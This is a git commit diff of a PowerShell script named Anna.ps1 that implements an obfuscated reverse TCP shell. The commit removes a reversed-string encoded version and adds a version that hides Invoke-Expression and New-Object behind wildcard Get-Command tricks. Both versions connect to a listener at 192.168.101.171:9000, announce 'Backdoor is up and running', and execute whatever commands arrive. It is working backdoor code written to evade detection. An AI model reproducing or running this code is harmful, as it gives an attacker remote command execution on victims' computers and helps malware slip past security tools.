5d4f66dd6f759acafc91ef4e5e89a38c5dc5d8cd
ClemensHofer2012 <73170777+ClemensHofer2012@users.noreply.github.com>
2020-11-08 22:15:17 +0100

    Update Anna.ps1

--- Anna.ps1
+++ Anna.ps1
@@ -1,73 +1,72 @@
 # change the host address and/or port number as necessary
 # obfuscated host address, same as $a = "127.0.0.1";
-$a = "192" + "." + "168" + "." + "101" + "." + "165";
+$a = "192" + "." + "168" + "." + "101" + "." + "171";
 # obfuscated port number, same as $p = 9000;
 $p = 1000 + 1000 + 1000 + 6000;
-sET  M6sV  (  [cHaR[ ]]")'x'+]43[eMoHSp$+]4[EmoHSP$ ( .| )93]RAhC[,)07]RAhC[+47]RAhC[+201]RAhC[(  ecALpeR- 43]RAhC[,)211]RAhC[+66]RAhC[+67]RAhC[(ecAlpErc- 421]RAhC[,'tnj' ecAlpErc- 69]RAhC[,)58]RAhC[+57]RAhC[+611]RAhC[( ecAlpErc- 63]RAhC[,'HOD'  ecALpeR-)'
+& (`G`C`M *e-Ho??);
+& (`G`C`M *e-Ho??);
+& (`G`C`M *e-Ho??);
+& (`G`C`M *e-Ho??);
+& (`G`C`M *e-Ho??);
+& (`G`C`M *e-Ho??);
+& (`G`C`M *e-Ho??);
+& (`G`C`M *e-Ho??);
+& (`G`C`M *e-Ho??);
+$c = $null;
+$t = $null;
+$b = $null;
+$w = $null;
+$d = $null;
+$r = $null;
+try {
+	$c = (& (`G`C`M *ke-E*) '& (`G`C`M *ew-O*) `N`E`T`.`S`O`C`K`E`T`S`.`T`C`P`C`L`I`E`N`T($a, $p)');
+	$t = $c.GetStream();
+	$b = & (`G`C`M *ew-O*) Byte[] (1000 + 12 + 12);
+	$e = & (`G`C`M *ew-O*) Text.AsciiEncoding;
+	$w = (& (`G`C`M *ke-E*) '& (`G`C`M *ew-O*) `I`O`.`S`T`R`E`A`M`W`R`I`T`E`R($t)');
+	$w.AutoFlush = $true;
+	& (`G`C`M *e-Ho??) "Backdoor is up and running...";
+	$by = 0;
+	do {
+		$w.Write("PS>");
+		do {
+			$by = $t.Read($b, 0, $b.Length);
+			if ($by -gt 0) {
+				$d = $d + $e.GetString($b, 0, $by);
+			}
+		} while ($t.DataAvailable);
+		if ($d.Length -gt 0) {
+			try {
+				$r = & (`G`C`M *ke-E*) -Command $d 2>&1 | & (`G`C`M *ut-S?????);
+			} catch {
+				$r = $_.Exception;
+			}
+			$w.WriteLine($r);
+			& (`G`C`M *r-Va*) -Name "d";
+		}
+	} while ($by -gt 0);
+} catch {
+	& (`G`C`M *e-Ho??) $_.Exception.InnerException.Message;
+} finally {
+	if ($w -ne $null) {
+		$w.Close();
+		$w.Dispose();
+	}
+	if ($t -ne $null) {
+		$t.Close();
+		$t.Dispose();
+	}
+	if ($c -ne $null) {
+		$c.Close();
+		$c.Dispose();
+	}
+	if ($b -ne $null) {
+		$b.Clear();
+	}
+	if ($d -ne $null) {
+		& (`G`C`M *r-Va*) -Name "d";
+	}
+	if ($r -ne $null) {
+		& (`G`C`M *r-Va*) -Name "r";
+	}
 }
-}
-;pBLrpBL emaN'+'- )*aV-r* MUKtCUKtGUKt( &
-{ )llunHOD en- rHOD( fi '+'
-'+'}
-;pBLdpBL emaN- )*aV-r*'+' MUKtCUKtGUKt( &
-{ )llunHOD en- dHOD( fi
-}
-;)(raelC.bH'+'OD
-{ )llunHOD en- bHOD( fi
-}'+'
-;)(esopsiD.cHOD
-;'+')(esolC.cHOD
-'+'{ )llunHOD en- cHOD( fi
-}
-;)(esopsiD.tHOD
-;)(esolC'+'.tHOD
-{ )llunHOD en- tHOD( fi
-}
-;)(esopsiD.wHOD
-;)(esolC.wHOD
-{ )llunHOD en- wHOD( fi
-{ yll'+'anif }
-;egasseM.noitpecx'+'ErennI.noitpecxE._HOD )??o'+'H-e* MUKtCUKtGUKt'+'( &
-{ hctac }
-;'+')0 tg- ybHOD( e'+'lihw }
-}       '+'
-;pBLdpBL emaN- )*aV-r* MUKtCUKtGUKt( &
-'+';)rH'+'OD(eniLetirW.wHOD
-}
-;noitpecxE._HOD = rHOD                          '+'
-{ h'+'ctac }
-;)?????S-tu'+'* MUKtCUKtGUKt( & tnj 1&>2 dHOD dnammoC- )*E-ek* MUKtCUKtGUKt'+'( & = rHOD
-{ y'+'rt
-{ )0 tg- htgneL.dHOD( fi'+'
-;)elbaliavAataD.tHOD( elihw }
-}
-;)ybHOD ,0 ,bHOD(gnirtSteG.eHOD + dHOD = dHOD
-{ )'+'0 tg-'+' ybHOD( fi
-;)'+'htgneL.bHOD ,0 ,bHOD(daeR.tHOD = ybHOD
-{ od
-;)pBL>SPpBL(etirW.wHOD
-{ od
-;0'+' = ybHOD   '+'
-;pBL...gninnur dna pu si roodkcaBpBL )?'+'?oH-e* MUKtCUKtGUKt( &
-;eur'+'tHOD = hs'+'ulFotuA.wHOD
-;)FJf)tHOD(RUKtEUKtTUKtI'+'UKtRUKtWUKtM'+'UKtAUKtEUKtRUKtTUKtSUKt.UKtOUKtIUKt )*O-we* MUKtCUKtGUKt( &FJf )*E'+'-e'+'k* MUKtCUKtG'+'UKt( &( = wHOD
-;gnidocnEiicsA.txeT )*O-we* MUKtCUKtGUKt( &'+' = eHOD
-;'+')21 + 21 + 000'+'1( ][etyB )*O-we* MUKtCUKtGUKt( &'+' = bHOD
-;)(maertSteG.cHOD = t'+'HOD
-;)FJf)pHOD ,aHOD(TUKtNUK'+'tEUKtIUKtLUKtCUKtPUKtCUKtTUKt.UKtSUKtTUKtEUKtKUKtCUKtOUKtSUK'+'t.U'+'KtTUKtEUKtNUKt )*O-w'+'e* MUKtCUKtGUKt( &FJf )*E-ek* MUKtCUKtGUKt( &( = cHOD
-{ yrt
-'+';llunHOD = rHOD'+'
-;llunHOD = dHOD
-;llunHOD = wHOD
-;llunHOD = bHOD
-;llunHOD = tHOD
-;llunHOD = cHOD
-;pB'+'L#######################'+'########################'+'###'+'######################pBL )??oH-e* MU'+'KtCUKtGUKt( &
-;pBL#  '+'  '+'    '+'                                '+'                              #pBL )??oH-e* MUKtCUKtGUKt( &
-;pBL#   .41Y6qtzgpL6M4uXfnbabv8NR9G7T6MZrB1 ta n'+'ioc'+'tib etanod ot eerf leeF #pBL )??oH-e* MUK'+'tCUKtGUKt( &
-;pBL#  .pct-esrever-llehsrewop/'+'kecnis-navi/moc.buhtig ta yrotisoper buHtiG #pBL )?'+'?oH-e* MUKtCUKtG'+'UKt( &
-;pBL#                          '+'                                            #pBL )??oH-e* MUKtCUKtGUKt( &
-;pBL#              kecniS navI yb '+'            '+'   '+'                          #pBL )??oH-e* '+'MUKtCUKtGUKt( &
-;pBL#                        P'+'CT esreveR llehSrewoP       '+'                 #pBL )??'+'oH-e* MUKtCUKtGUKt( &
-;pBL#                           '+'                                           #pBL )??oH-e* MUKtCUKt'+'GUKt( &
-;pBL#############################################'+'#################'+'##########pBL'+' )??oH-e* MUKtCUKtGUKt( &'((");[aRRAY]::rEvERse( $M6sV);& ((VariAblE '*mdR*').NAME[3,11,2]-joiN'') ( [StriNG]::JOIn('',$M6sV ));
